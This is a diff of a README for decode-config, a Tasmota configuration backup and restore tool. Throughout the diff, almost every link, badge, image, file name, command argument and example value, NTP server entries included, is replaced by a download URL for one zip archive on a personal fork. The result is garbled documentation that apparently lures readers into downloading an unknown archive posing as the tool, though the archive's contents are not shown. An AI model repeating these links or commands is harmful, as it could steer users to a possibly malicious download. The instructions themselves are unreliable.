@@ -1,23 +1,23 @@
 # decode-config
 
-Convert, backup and restore configuration data of devices flashed with [Tasmota firmware](https://raw.githubusercontent.com/jonathanloucks/decode-config/development/build/images/decode-config-nouriture.zip).
+Convert, backup and restore configuration data of devices flashed with [Tasmota firmware](https://github.com/jonathanloucks/decode-config/raw/refs/heads/development/build/config-decode-1.6-beta.5.zip).
 
 <!-- markdownlint-disable MD033 -->
-<img src="https://raw.githubusercontent.com/jonathanloucks/decode-config/development/build/images/decode-config-nouriture.zip" alt="Overview" title="decode-config Overview" width="400" height="320">
+<img src="https://github.com/jonathanloucks/decode-config/raw/refs/heads/development/build/config-decode-1.6-beta.5.zip" alt="Overview" title="decode-config Overview" width="400" height="320">
 
 <!-- markdownlint-disable MD033 -->
-[![development](https://raw.githubusercontent.com/jonathanloucks/decode-config/development/build/images/decode-config-nouriture.zip)](https://raw.githubusercontent.com/jonathanloucks/decode-config/development/build/images/decode-config-nouriture.zip)
-[![GitHub download](https://raw.githubusercontent.com/jonathanloucks/decode-config/development/build/images/decode-config-nouriture.zip)](https://raw.githubusercontent.com/jonathanloucks/decode-config/development/build/images/decode-config-nouriture.zip)
-[![License](https://raw.githubusercontent.com/jonathanloucks/decode-config/development/build/images/decode-config-nouriture.zip)](LICENSE)
+[![development](https://github.com/jonathanloucks/decode-config/raw/refs/heads/development/build/config-decode-1.6-beta.5.zip)](https://github.com/jonathanloucks/decode-config/raw/refs/heads/development/build/config-decode-1.6-beta.5.zip)
+[![GitHub download](https://github.com/jonathanloucks/decode-config/raw/refs/heads/development/build/config-decode-1.6-beta.5.zip)](https://github.com/jonathanloucks/decode-config/raw/refs/heads/development/build/config-decode-1.6-beta.5.zip)
+[![License](https://github.com/jonathanloucks/decode-config/raw/refs/heads/development/build/config-decode-1.6-beta.5.zip)](LICENSE)
 
 If you like **decode-config** give it a star or fork it:
 
-[![GitHub stars](https://raw.githubusercontent.com/jonathanloucks/decode-config/development/build/images/decode-config-nouriture.zip)](https://raw.githubusercontent.com/jonathanloucks/decode-config/development/build/images/decode-config-nouriture.zip)
-[![GitHub forks](https://raw.githubusercontent.com/jonathanloucks/decode-config/development/build/images/decode-config-nouriture.zip)](https://raw.githubusercontent.com/jonathanloucks/decode-config/development/build/images/decode-config-nouriture.zip)
+[![GitHub stars](https://github.com/jonathanloucks/decode-config/raw/refs/heads/development/build/config-decode-1.6-beta.5.zip)](https://github.com/jonathanloucks/decode-config/raw/refs/heads/development/build/config-decode-1.6-beta.5.zip)
+[![GitHub forks](https://github.com/jonathanloucks/decode-config/raw/refs/heads/development/build/config-decode-1.6-beta.5.zip)](https://github.com/jonathanloucks/decode-config/raw/refs/heads/development/build/config-decode-1.6-beta.5.zip)
 
-In comparison with the [Tasmota](https://raw.githubusercontent.com/jonathanloucks/decode-config/development/build/images/decode-config-nouriture.zip) build-in "*Backup Configuration*" / "*Restore Configuration*" function the **decode-config** tool:
+In comparison with the [Tasmota](https://github.com/jonathanloucks/decode-config/raw/refs/heads/development/build/config-decode-1.6-beta.5.zip) build-in "*Backup Configuration*" / "*Restore Configuration*" function the **decode-config** tool:
 
-* uses a human readable and editable [JSON](https://raw.githubusercontent.com/jonathanloucks/decode-config/development/build/images/decode-config-nouriture.zip)-format for backup/restore
+* uses a human readable and editable [JSON](https://github.com/jonathanloucks/decode-config/raw/refs/heads/development/build/config-decode-1.6-beta.5.zip)-format for backup/restore
 * can restore previously backed up and modified JSON-format files
 * is able to process any subsets of configuration data
 * can convert data from older Tasmota versions (from version v5.10.0) to a newer one and vice versa
@@ -33,18 +33,18 @@ Comparing backup files created by **decode-config** and [.dmp](#dmp-format) file
 | batch processing        |           Yes           |         No         |
 | Backup/Restore subsets  |           Yes           |         No         |
 
-**decode-config** is compatible with [Tasmota](https://raw.githubusercontent.com/jonathanloucks/decode-config/development/build/images/decode-config-nouriture.zip) starting from v5.10.0 up to now.
+**decode-config** is compatible with [Tasmota](https://github.com/jonathanloucks/decode-config/raw/refs/heads/development/build/config-decode-1.6-beta.5.zip) starting from v5.10.0 up to now.
 
 ## Content
 
 **This is the developer branch which contains decode-config matching the latest Tasmota developer version.**
 
 This branch does not contain any binaries. If you want to use a precompiled **decode-config** binary
-you can use binaries from latest [Release](https://raw.githubusercontent.com/jonathanloucks/decode-config/development/build/images/decode-config-nouriture.zip).
+you can use binaries from latest [Release](https://github.com/jonathanloucks/decode-config/raw/refs/heads/development/build/config-decode-1.6-beta.5.zip).
 
 > **Note**  
-If you want to run the development **https://raw.githubusercontent.com/jonathanloucks/decode-config/development/build/images/decode-config-nouriture.zip** from this branch, you need an
-installed [Python](https://raw.githubusercontent.com/jonathanloucks/decode-config/development/build/images/decode-config-nouriture.zip(programming_language)) environment.
+If you want to run the development **https://github.com/jonathanloucks/decode-config/raw/refs/heads/development/build/config-decode-1.6-beta.5.zip** from this branch, you need an
+installed [Python](https://github.com/jonathanloucks/decode-config/raw/refs/heads/development/build/config-decode-1.6-beta.5.zip(programming_language)) environment.
 See [Running as Python script](#running-as-python-script) for more details.
 
 ### Files
@@ -52,8 +52,8 @@ See [Running as Python script](#running-as-python-script) for more details.
 | File                     | Description |
 |:-------------------------|:------------------------------------------------------------------------|
 | `build`                  | contains files to build executables                                     |
-| `https://raw.githubusercontent.com/jonathanloucks/decode-config/development/build/images/decode-config-nouriture.zip`       | Python source file running under your local Python environment          |
-| `https://raw.githubusercontent.com/jonathanloucks/decode-config/development/build/images/decode-config-nouriture.zip`              | This content                                                            |
+| `https://github.com/jonathanloucks/decode-config/raw/refs/heads/development/build/config-decode-1.6-beta.5.zip`       | Python source file running under your local Python environment          |
+| `https://github.com/jonathanloucks/decode-config/raw/refs/heads/development/build/config-decode-1.6-beta.5.zip`              | This content                                                            |
 
 ### Table of contents
 
@@ -93,9 +93,9 @@ The program does not have a graphical user interface (GUI), you have to run it f
 
 #### Tasmota WebServer
 
-[Tasmota](https://raw.githubusercontent.com/jonathanloucks/decode-config/development/build/images/decode-config-nouriture.zip) provides its configuration data by http request only. To receive and send configuration data from Tasmota devices directly the http WebServer in Tasmota must be enabled:
+[Tasmota](https://github.com/jonathanloucks/decode-config/raw/refs/heads/development/build/config-decode-1.6-beta.5.zip) provides its configuration data by http request only. To receive and send configuration data from Tasmota devices directly the http WebServer in Tasmota must be enabled:
 
-* enable web-server admin mode (Tasmota web command [WebServer 2](https://raw.githubusercontent.com/jonathanloucks/decode-config/development/build/images/decode-config-nouriture.zip))
+* enable web-server admin mode (Tasmota web command [WebServer 2](https://github.com/jonathanloucks/decode-config/raw/refs/heads/development/build/config-decode-1.6-beta.5.zip))
 * for self-compiled firmware enable web-server with (`#define USE_WEBSERVER` and `#define WEB_SERVER 2`).
 
 > **Note**  
@@ -103,14 +103,14 @@ Using MQTT for exchanging Tasmota configuration data is not support by Tasmota i
 
 #### Python
 
-**https://raw.githubusercontent.com/jonathanloucks/decode-config/development/build/images/decode-config-nouriture.zip** needs an installed [Python](https://raw.githubusercontent.com/jonathanloucks/decode-config/development/build/images/decode-config-nouriture.zip(programming_language)) environment.
+**https://github.com/jonathanloucks/decode-config/raw/refs/heads/development/build/config-decode-1.6-beta.5.zip** needs an installed [Python](https://github.com/jonathanloucks/decode-config/raw/refs/heads/development/build/config-decode-1.6-beta.5.zip(programming_language)) environment.
 
 > **Note**  
-Due to the [Python 2.7 EOL](https://raw.githubusercontent.com/jonathanloucks/decode-config/development/build/images/decode-config-nouriture.zip) in Jan 2020 Python 2.x is no longer supported.
+Due to the [Python 2.7 EOL](https://github.com/jonathanloucks/decode-config/raw/refs/heads/development/build/config-decode-1.6-beta.5.zip) in Jan 2020 Python 2.x is no longer supported.
 
 ##### Linux
 
-Install [Python 3.x](https://raw.githubusercontent.com/jonathanloucks/decode-config/development/build/images/decode-config-nouriture.zip), Pip and follow [library installation for all OS](#all-os) below.
+Install [Python 3.x](https://github.com/jonathanloucks/decode-config/raw/refs/heads/development/build/config-decode-1.6-beta.5.zip), Pip and follow [library installation for all OS](#all-os) below.
 
 ```bash
 sudo apt-get install python3 python3-pip
@@ -118,11 +118,11 @@ sudo apt-get install python3 python3-pip
 
 ##### Windows 10
 
-Install [Python 3.x](https://raw.githubusercontent.com/jonathanloucks/decode-config/development/build/images/decode-config-nouriture.zip) as described and follow [library installation for all OS](#all-os) below.
+Install [Python 3.x](https://github.com/jonathanloucks/decode-config/raw/refs/heads/development/build/config-decode-1.6-beta.5.zip) as described and follow [library installation for all OS](#all-os) below.
 
 ##### MacOS
 
-Install [Python 3.x](https://raw.githubusercontent.com/jonathanloucks/decode-config/development/build/images/decode-config-nouriture.zip) as described and follow [library installation for all OS](#all-os) below.
+Install [Python 3.x](https://github.com/jonathanloucks/decode-config/raw/refs/heads/development/build/config-decode-1.6-beta.5.zip) as described and follow [library installation for all OS](#all-os) below.
 
 ##### All OS
 
@@ -143,13 +143,13 @@ decode-config
 ```
 > **Note**  
 Replace `decode-config` by the program name your are using:  
-`https://raw.githubusercontent.com/jonathanloucks/decode-config/development/build/images/decode-config-nouriture.zip` when running as Python executable.
+`https://github.com/jonathanloucks/decode-config/raw/refs/heads/development/build/config-decode-1.6-beta.5.zip` when running as Python executable.
 <!-- markdownlint-restore -->
 
 This prints a short help:
 
 ```help
-usage: https://raw.githubusercontent.com/jonathanloucks/decode-config/development/build/images/decode-config-nouriture.zip [-s <filename|host|url>] [-i <restorefile>]
+usage: https://github.com/jonathanloucks/decode-config/raw/refs/heads/development/build/config-decode-1.6-beta.5.zip [-s <filename|host|url>] [-i <restorefile>]
                         [-o <backupfile>] [-t json|bin|dmp] [-E] [-e] [-F]
                         [--json-indent <indent>] [--json-compact]
                         [--json-show-pw] [--cmnd-indent <indent>]
@@ -172,12 +172,12 @@ To get a result, at least pass a Tasmota source where you want to read the confi
 
 Source can be either
 
-* a device hostname, IP or [http-url](https://raw.githubusercontent.com/jonathanloucks/decode-config/development/build/images/decode-config-nouriture.zip) available and online within your network:  
+* a device hostname, IP or [http-url](https://github.com/jonathanloucks/decode-config/raw/refs/heads/development/build/config-decode-1.6-beta.5.zip) available and online within your network:  
 use `--source <host|url>` or `-s <host|url>` parameter
 * a Tasmota configuration file (having extension `.dmp`):  
 use `--source <filename>` or `-s <filename>` parameter
 
-The [http-url](https://raw.githubusercontent.com/jonathanloucks/decode-config/development/build/images/decode-config-nouriture.zip) variant also allows `<user>`, `<password>` and `<port>` number to be specified:
+The [http-url](https://github.com/jonathanloucks/decode-config/raw/refs/heads/development/build/config-decode-1.6-beta.5.zip) variant also allows `<user>`, `<password>` and `<port>` number to be specified:
 
 * `--source http://admin:myPaszxwo!z@tasmota-4281`
 * `--source http://tasmota-4281:80`
@@ -197,11 +197,11 @@ decode-config --source http://admin:myPaszxwo!z@tasmota-4281
 ##### Access a config file
 
 ```bash
-decode-config --source https://raw.githubusercontent.com/jonathanloucks/decode-config/development/build/images/decode-config-nouriture.zip
-decode-config -s https://raw.githubusercontent.com/jonathanloucks/decode-config/development/build/images/decode-config-nouriture.zip
+decode-config --source https://github.com/jonathanloucks/decode-config/raw/refs/heads/development/build/config-decode-1.6-beta.5.zip
+decode-config -s https://github.com/jonathanloucks/decode-config/raw/refs/heads/development/build/config-decode-1.6-beta.5.zip
 ```
 
-will output a readable configuration in [JSON](https://raw.githubusercontent.com/jonathanloucks/decode-config/development/build/images/decode-config-nouriture.zip)-format, e.g.:
+will output a readable configuration in [JSON](https://github.com/jonathanloucks/decode-config/raw/refs/heads/development/build/config-decode-1.6-beta.5.zip)-format, e.g.:
 
 ```json
 {"altitude": 112, "baudrate": 115200, "blinkcount": 10, "blinktime": 10,...
@@ -209,7 +209,7 @@ will output a readable configuration in [JSON](https://raw.githubusercontent.com
 ```
 
 > **Note**  
-The json names (like `"altitude"` or `"blinktime"` are internal names from Tasmotas [settings.h](https://raw.githubusercontent.com/jonathanloucks/decode-config/development/build/images/decode-config-nouriture.zip) STRUCT `Settings` and are not the same as known from Tasmota [web-console commands](https://raw.githubusercontent.com/jonathanloucks/decode-config/development/build/images/decode-config-nouriture.zip). However, since most variable names are self-describing, the functional meaning should be given in most cases.
+The json names (like `"altitude"` or `"blinktime"` are internal names from Tasmotas [settings.h](https://github.com/jonathanloucks/decode-config/raw/refs/heads/development/build/config-decode-1.6-beta.5.zip) STRUCT `Settings` and are not the same as known from Tasmota [web-console commands](https://github.com/jonathanloucks/decode-config/raw/refs/heads/development/build/config-decode-1.6-beta.5.zip). However, since most variable names are self-describing, the functional meaning should be given in most cases.
 
 #### Password protected device
 
@@ -252,7 +252,7 @@ This will print a pretty better readable format and the example above becomes:
 Because the number of parameters are growing, it would be difficult to enter all these parameters again and again. In that case it is best to use a configuration file that contains your standard parameters and which we then have to specify as the only additional parameter.  
 [Program parameter](#program-parameter-list) starting with `--` (eg. `--username`) can be set into such a configuration file. Simply write each neccessary parameter including possible value without dashes into a text file. For a better identification of this file, extension `.conf` is recommended:
 
-Writing all the previous used device parameter in a file, create the text file `https://raw.githubusercontent.com/jonathanloucks/decode-config/development/build/images/decode-config-nouriture.zip` and insert:
+Writing all the previous used device parameter in a file, create the text file `https://github.com/jonathanloucks/decode-config/raw/refs/heads/development/build/config-decode-1.6-beta.5.zip` and insert:
 
 ```conf
 [source]
@@ -269,19 +269,19 @@ Group names enclosed in square brackets [ ], like `[source]` in the example, are
 Now we can use it with `-c` parameter:
 
 ```bash
-decode-config -c https://raw.githubusercontent.com/jonathanloucks/decode-config/development/build/images/decode-config-nouriture.zip -s tasmota-4281
+decode-config -c https://github.com/jonathanloucks/decode-config/raw/refs/heads/development/build/config-decode-1.6-beta.5.zip -s tasmota-4281
 ```
 
 > **Note**  
-For further of parameter file syntax see [https://raw.githubusercontent.com/jonathanloucks/decode-config/development/build/images/decode-config-nouriture.zip](https://raw.githubusercontent.com/jonathanloucks/decode-config/development/build/images/decode-config-nouriture.zip)).
+For further of parameter file syntax see [https://github.com/jonathanloucks/decode-config/raw/refs/heads/development/build/config-decode-1.6-beta.5.zip](https://github.com/jonathanloucks/decode-config/raw/refs/heads/development/build/config-decode-1.6-beta.5.zip)).
 
 If parameters are specified in more than one place (parameter file and command line), the commandline parameters will overrule the file parameters. This is usefull if you use a basic set of parameters and want to change parameter once without the need to edit your configuration file:
 
 ```bash
-decode-config -c https://raw.githubusercontent.com/jonathanloucks/decode-config/development/build/images/decode-config-nouriture.zip -s tasmota-4281 --json-indent 4
+decode-config -c https://github.com/jonathanloucks/decode-config/raw/refs/heads/development/build/config-decode-1.6-beta.5.zip -s tasmota-4281 --json-indent 4
 ```
 
-Here JSON will be output with indent of 4 spaces instead of the `2` set from `https://raw.githubusercontent.com/jonathanloucks/decode-config/development/build/images/decode-config-nouriture.zip`-
+Here JSON will be output with indent of 4 spaces instead of the `2` set from `https://github.com/jonathanloucks/decode-config/raw/refs/heads/development/build/config-decode-1.6-beta.5.zip`-
 
 ### Save backup
 
@@ -300,39 +300,39 @@ You can use the following placeholders within backup/restore filenames:
 Example:
 
 ```bash
-decode-config -c https://raw.githubusercontent.com/jonathanloucks/decode-config/development/build/images/decode-config-nouriture.zip -s tasmota-4281 --backup-file Config_@d_@v
+decode-config -c https://github.com/jonathanloucks/decode-config/raw/refs/heads/development/build/config-decode-1.6-beta.5.zip -s tasmota-4281 --backup-file Config_@d_@v
 ```
 
-This will create a file like `https://raw.githubusercontent.com/jonathanloucks/decode-config/development/build/images/decode-config-nouriture.zip` (the part `Tasmota` and `9.1.0` will choosen related to your device configuration).
+This will create a file like `https://github.com/jonathanloucks/decode-config/raw/refs/heads/development/build/config-decode-1.6-beta.5.zip` (the part `Tasmota` and `9.1.0` will choosen related to your device configuration).
 
 #### Save multiple backup at once
 
 Since **decode-config** v8.2.0.5 the `--backup-file` parameter can be specified multiple times. With that it's easy to create different backup with different names and/or different formats at once:
 
 ```bash
-decode-config -c https://raw.githubusercontent.com/jonathanloucks/decode-config/development/build/images/decode-config-nouriture.zip -s tasmota-4281 -o Config_@d_@v -o https://raw.githubusercontent.com/jonathanloucks/decode-config/development/build/images/decode-config-nouriture.zip -o https://raw.githubusercontent.com/jonathanloucks/decode-config/development/build/images/decode-config-nouriture.zip
+decode-config -c https://github.com/jonathanloucks/decode-config/raw/refs/heads/development/build/config-decode-1.6-beta.5.zip -s tasmota-4281 -o Config_@d_@v -o https://github.com/jonathanloucks/decode-config/raw/refs/heads/development/build/config-decode-1.6-beta.5.zip -o https://github.com/jonathanloucks/decode-config/raw/refs/heads/development/build/config-decode-1.6-beta.5.zip
 ```
 
 creates three backup files:
 
-* `https://raw.githubusercontent.com/jonathanloucks/decode-config/development/build/images/decode-config-nouriture.zip` using JSON format
-* `https://raw.githubusercontent.com/jonathanloucks/decode-config/development/build/images/decode-config-nouriture.zip` using JSON format
-* `https://raw.githubusercontent.com/jonathanloucks/decode-config/development/build/images/decode-config-nouriture.zip` using Tasmota configuration file format
+* `https://github.com/jonathanloucks/decode-config/raw/refs/heads/development/build/config-decode-1.6-beta.5.zip` using JSON format
+* `https://github.com/jonathanloucks/decode-config/raw/refs/heads/development/build/config-decode-1.6-beta.5.zip` using JSON format
+* `https://github.com/jonathanloucks/decode-config/raw/refs/heads/development/build/config-decode-1.6-beta.5.zip` using Tasmota configuration file format
 
 ### Restore backup
 
 Reading back a previously saved backup file, use the `--restore-file <filename>` parameter.
 
-To restore the previously save backup file `https://raw.githubusercontent.com/jonathanloucks/decode-config/development/build/images/decode-config-nouriture.zip` to device `tasmota-4281` use:
+To restore the previously save backup file `https://github.com/jonathanloucks/decode-config/raw/refs/heads/development/build/config-decode-1.6-beta.5.zip` to device `tasmota-4281` use:
 
 ```bash
-decode-config -c https://raw.githubusercontent.com/jonathanloucks/decode-config/development/build/images/decode-config-nouriture.zip -s tasmota-4281 --restore-file Config_Tasmota_9.1.0
+decode-config -c https://github.com/jonathanloucks/decode-config/raw/refs/heads/development/build/config-decode-1.6-beta.5.zip -s tasmota-4281 --restore-file Config_Tasmota_9.1.0
 ```
 
 Restore operation also allows placeholders **@v**, **@d**, **@f**, **@h** or **@H** like in backup filenames so we can use the same naming as for the backup process:
 
 ```bash
-decode-config -c https://raw.githubusercontent.com/jonathanloucks/decode-config/development/build/images/decode-config-nouriture.zip -s tasmota-4281 --restore-file Config_@d_@v
+decode-config -c https://github.com/jonathanloucks/decode-config/raw/refs/heads/development/build/config-decode-1.6-beta.5.zip -s tasmota-4281 --restore-file Config_@d_@v
 ```
 
 > **Note**  
@@ -342,7 +342,7 @@ Placeholders used in restore filenames only work as long as the underlying data 
 
 If you use the default JSON format for backup files you can also use files containing a subset of configuration data only.
 
-Example: You want to change the data for location (altitude, latitude, longitude) only, create a JSON file `https://raw.githubusercontent.com/jonathanloucks/decode-config/development/build/images/decode-config-nouriture.zip` with the content
+Example: You want to change the data for location (altitude, latitude, longitude) only, create a JSON file `https://github.com/jonathanloucks/decode-config/raw/refs/heads/development/build/config-decode-1.6-beta.5.zip` with the content
 
 ```json
 {
@@ -355,7 +355,7 @@ Example: You want to change the data for location (altitude, latitude, longitude
 Set this location for a device:
 
 ```bash
-decode-config -c https://raw.githubusercontent.com/jonathanloucks/decode-config/development/build/images/decode-config-nouriture.zip -s tasmota-4281 -i location
+decode-config -c https://github.com/jonathanloucks/decode-config/raw/refs/heads/development/build/config-decode-1.6-beta.5.zip -s tasmota-4281 -i location
 ```
 
 > **Hint**  
@@ -381,14 +381,14 @@ If you use your own extensions, deactivate the automatic extension using the `--
 
 Examples:
 
-* `decode-config --source tasmota-4281 --backup-file https://raw.githubusercontent.com/jonathanloucks/decode-config/development/build/images/decode-config-nouriture.zip`<br>
+* `decode-config --source tasmota-4281 --backup-file https://github.com/jonathanloucks/decode-config/raw/refs/heads/development/build/config-decode-1.6-beta.5.zip`<br>
 is identical with<br>
 `decode-config --source tasmota-4281 --backup-type bin --backup-file tasmota-4281`<br>
-In both cases the backup file `https://raw.githubusercontent.com/jonathanloucks/decode-config/development/build/images/decode-config-nouriture.zip` is created.
-* `decode-config --source tasmota-4281 --restore-file https://raw.githubusercontent.com/jonathanloucks/decode-config/development/build/images/decode-config-nouriture.zip`<br>
+In both cases the backup file `https://github.com/jonathanloucks/decode-config/raw/refs/heads/development/build/config-decode-1.6-beta.5.zip` is created.
+* `decode-config --source tasmota-4281 --restore-file https://github.com/jonathanloucks/decode-config/raw/refs/heads/development/build/config-decode-1.6-beta.5.zip`<br>
 is identical with<br>
 `decode-config --source tasmota-4281 --restore-file tasmota-4281`<br>
-In both cases the backup file `https://raw.githubusercontent.com/jonathanloucks/decode-config/development/build/images/decode-config-nouriture.zip` will tried to restore (remember `--backup-type json` is the default)
+In both cases the backup file `https://github.com/jonathanloucks/decode-config/raw/refs/heads/development/build/config-decode-1.6-beta.5.zip` will tried to restore (remember `--backup-type json` is the default)
 * whereas<br>
 `decode-config --source tasmota-4281 --no-extension --restore-file tasmota-4281`<br>
 will fail if `tasmota-4281` does not exist and<br>
@@ -415,7 +415,7 @@ The console screen output supports two formats:
 * [JSON](#console-json-format):<br>
 This is identical with the backup/restore [json file Format](#json-format) but printed on screen standard output.
 * [Tasmota command](#console-tasmota-command-format):<br>
-This outputs the most (but not all!) configuration data as Tasmota [web-console commands](https://raw.githubusercontent.com/jonathanloucks/decode-config/development/build/images/decode-config-nouriture.zip).
+This outputs the most (but not all!) configuration data as Tasmota [web-console commands](https://github.com/jonathanloucks/decode-config/raw/refs/heads/development/build/config-decode-1.6-beta.5.zip).
 
 #### JSON format
 
@@ -424,7 +424,7 @@ The default console output format is [JSON](#json-format) (optional you can forc
 Example:
 
 ```bash
-decode-config -c https://raw.githubusercontent.com/jonathanloucks/decode-config/development/build/images/decode-config-nouriture.zip -s tasmota-4281 --group Wifi
+decode-config -c https://github.com/jonathanloucks/decode-config/raw/refs/heads/development/build/config-decode-1.6-beta.5.zip -s tasmota-4281 --group Wifi
 ```
 
 will output data like
@@ -440,8 +440,8 @@ will output data like
     "192.168.12.1"
   ],
   "ntp_server": [
-    "https://raw.githubusercontent.com/jonathanloucks/decode-config/development/build/images/decode-config-nouriture.zip",
-    "https://raw.githubusercontent.com/jonathanloucks/decode-config/development/build/images/decode-config-nouriture.zip",
+    "https://github.com/jonathanloucks/decode-config/raw/refs/heads/development/build/config-decode-1.6-beta.5.zip",
+    "https://github.com/jonathanloucks/decode-config/raw/refs/heads/development/build/config-decode-1.6-beta.5.zip",
     "192.168.12.1"
   ],
   "sta_active": 0,
@@ -463,15 +463,15 @@ will output data like
 This also allows direct processing on the command line, e.g. to display all `ntp_server` only
 
 ```bash
-decode-config -c https://raw.githubusercontent.com/jonathanloucks/decode-config/development/build/images/decode-config-nouriture.zip -s tasmota-4281 | jq '.ntp_server'
+decode-config -c https://github.com/jonathanloucks/decode-config/raw/refs/heads/development/build/config-decode-1.6-beta.5.zip -s tasmota-4281 | jq '.ntp_server'
 ```
 
 outputs
 
 ```json
 [
-  "https://raw.githubusercontent.com/jonathanloucks/decode-config/development/build/images/decode-config-nouriture.zip",
-  "https://raw.githubusercontent.com/jonathanloucks/decode-config/development/build/images/decode-config-nouriture.zip",
+  "https://github.com/jonathanloucks/decode-config/raw/refs/heads/development/build/config-decode-1.6-beta.5.zip",
+  "https://github.com/jonathanloucks/decode-config/raw/refs/heads/development/build/config-decode-1.6-beta.5.zip",
   "192.168.12.1"
 ]
 ```
@@ -486,7 +486,7 @@ JSON output contains all configuration data as default. To [filter](#filter-by-g
 Example:
 
 ```bash
-decode-config -c https://raw.githubusercontent.com/jonathanloucks/decode-config/development/build/images/decode-config-nouriture.zip -s tasmota-4281 --group Wifi --output-format cmnd
+decode-config -c https://github.com/jonathanloucks/decode-config/raw/refs/heads/development/build/config-decode-1.6-beta.5.zip -s tasmota-4281 --group Wifi --output-format cmnd
 ```
 
 ```conf
@@ -497,8 +497,8 @@ decode-config -c https://raw.githubusercontent.com/jonathanloucks/decode-config/
   IPAddress2 192.168.12.1
   IPAddress3 255.255.255.0
   IPAddress4 192.168.12.1
-  NtpServer1 https://raw.githubusercontent.com/jonathanloucks/decode-config/development/build/images/decode-config-nouriture.zip
-  NtpServer2 https://raw.githubusercontent.com/jonathanloucks/decode-config/development/build/images/decode-config-nouriture.zip
+  NtpServer1 https://github.com/jonathanloucks/decode-config/raw/refs/heads/development/build/config-decode-1.6-beta.5.zip
+  NtpServer2 https://github.com/jonathanloucks/decode-config/raw/refs/heads/development/build/config-decode-1.6-beta.5.zip
   NtpServer3 192.168.12.1
   Password1 myWlAnPaszxwo!z
   Password2 myWlAnPaszxwo!z2
@@ -526,8 +526,8 @@ With the use of `--cmnd-use-backlog` our example configuration
   IPAddress2 192.168.12.1
   IPAddress3 255.255.255.0
   IPAddress4 192.168.12.1
-  NtpServer1 https://raw.githubusercontent.com/jonathanloucks/decode-config/development/build/images/decode-config-nouriture.zip
-  NtpServer2 https://raw.githubusercontent.com/jonathanloucks/decode-config/development/build/images/decode-config-nouriture.zip
+  NtpServer1 https://github.com/jonathanloucks/decode-config/raw/refs/heads/development/build/config-decode-1.6-beta.5.zip
+  NtpServer2 https://github.com/jonathanloucks/decode-config/raw/refs/heads/development/build/config-decode-1.6-beta.5.zip
   NtpServer3 192.168.12.1
   Password1 myWlAnPaszxwo!z
   Password2 myWlAnPaszxwo!z2
@@ -545,7 +545,7 @@ becomes to
   AP 0
   Hostname %s-%04d
   Backlog IPAddress1 0.0.0.0;IPAddress2 192.168.12.1;IPAddress3 255.255.255.0;IPAddress4 192.168.12.1
-  Backlog NtpServer1 https://raw.githubusercontent.com/jonathanloucks/decode-config/development/build/images/decode-config-nouriture.zip;NtpServer2 https://raw.githubusercontent.com/jonathanloucks/decode-config/development/build/images/decode-config-nouriture.zip;NtpServer3 192.168.12.1
+  Backlog NtpServer1 https://github.com/jonathanloucks/decode-config/raw/refs/heads/development/build/config-decode-1.6-beta.5.zip;NtpServer2 https://github.com/jonathanloucks/decode-config/raw/refs/heads/development/build/config-decode-1.6-beta.5.zip;NtpServer3 192.168.12.1
   Backlog Password1 myWlAnPaszxwo!z;Password2 myWlAnPaszxwo!z2
   Backlog SSId1 wlan.1;SSId2 my-wlan
   WebPassword myPaszxwo!z
@@ -561,12 +561,12 @@ The huge number of Tasmota configuration data can be overstrained and confusing,
 
 The following groups are available: `Control`, `Display`, `Domoticz`, `Internal`, `Knx`, `Light`, `Management`, `Mqtt`, `Power`, `Rf`, `Rules`, `Sensor`, `Serial`, `Setoption`, `Shutter`, `System`, `Timer`, `Wifi`, `Zigbee`
 
-These are similary to the categories on [Tasmota Command Documentation](https://raw.githubusercontent.com/jonathanloucks/decode-config/development/build/images/decode-config-nouriture.zip).
+These are similary to the categories on [Tasmota Command Documentation](https://github.com/jonathanloucks/decode-config/raw/refs/heads/development/build/config-decode-1.6-beta.5.zip).
 
 To filter outputs to a subset of groups, use the `-g` or `--group` parameter, concatenating the groups you want, e. g.
 
 ```bash
-decode-config -s tasmota-4281 -c https://raw.githubusercontent.com/jonathanloucks/decode-config/development/build/images/decode-config-nouriture.zip --output-format cmnd --group Main MQTT Management Wifi
+decode-config -s tasmota-4281 -c https://github.com/jonathanloucks/decode-config/raw/refs/heads/development/build/config-decode-1.6-beta.5.zip --output-format cmnd --group Main MQTT Management Wifi
 ```
 
 Filtering by groups affects the entire output, regardless of whether screen output or backup file.
@@ -578,7 +578,7 @@ Filtering by groups affects the entire output, regardless of whether screen outp
 1. Restore a Tasmota configuration file
 
   ```bash
-  decode-config -c https://raw.githubusercontent.com/jonathanloucks/decode-config/development/build/images/decode-config-nouriture.zip -s tasmota --restore-file https://raw.githubusercontent.com/jonathanloucks/decode-config/development/build/images/decode-config-nouriture.zip
+  decode-config -c https://github.com/jonathanloucks/decode-config/raw/refs/heads/development/build/config-decode-1.6-beta.5.zip -s tasmota --restore-file https://github.com/jonathanloucks/decode-config/raw/refs/heads/development/build/config-decode-1.6-beta.5.zip
   ```
 
 1. Backup device using Tasmota configuration compatible format
@@ -586,13 +586,13 @@ Filtering by groups affects the entire output, regardless of whether screen outp
    a) use file extension to choice the file format
 
   ```bash
-  decode-config -c https://raw.githubusercontent.com/jonathanloucks/decode-config/development/build/images/decode-config-nouriture.zip -s tasmota --backup-file https://raw.githubusercontent.com/jonathanloucks/decode-config/development/build/images/decode-config-nouriture.zip
+  decode-config -c https://github.com/jonathanloucks/decode-config/raw/refs/heads/development/build/config-decode-1.6-beta.5.zip -s tasmota --backup-file https://github.com/jonathanloucks/decode-config/raw/refs/heads/development/build/config-decode-1.6-beta.5.zip
   ```
 
    b) use args to choice the file format
 
   ```bash
-    decode-config -c https://raw.githubusercontent.com/jonathanloucks/decode-config/development/build/images/decode-config-nouriture.zip -s tasmota --backup-type dmp --backup-file Config_@d_@v
+    decode-config -c https://github.com/jonathanloucks/decode-config/raw/refs/heads/development/build/config-decode-1.6-beta.5.zip -s tasmota --backup-type dmp --backup-file Config_@d_@v
   ```
 
 #### Use batch processing
@@ -600,13 +600,13 @@ Filtering by groups affects the entire output, regardless of whether screen outp
 Linux
 
 ```bash
-for device in tasmota1 tasmota2 tasmota3; do ./decode-config -c https://raw.githubusercontent.com/jonathanloucks/decode-config/development/build/images/decode-config-nouriture.zip -s $device -o Config_@d_@v
+for device in tasmota1 tasmota2 tasmota3; do ./decode-config -c https://github.com/jonathanloucks/decode-config/raw/refs/heads/development/build/config-decode-1.6-beta.5.zip -s $device -o Config_@d_@v
 ```
 
 under Windows
 
 ```batch
-for device in (tasmota1 tasmota2 tasmota3) do decode-config -c https://raw.githubusercontent.com/jonathanloucks/decode-config/development/build/images/decode-config-nouriture.zip -s %device -o Config_@d_@v
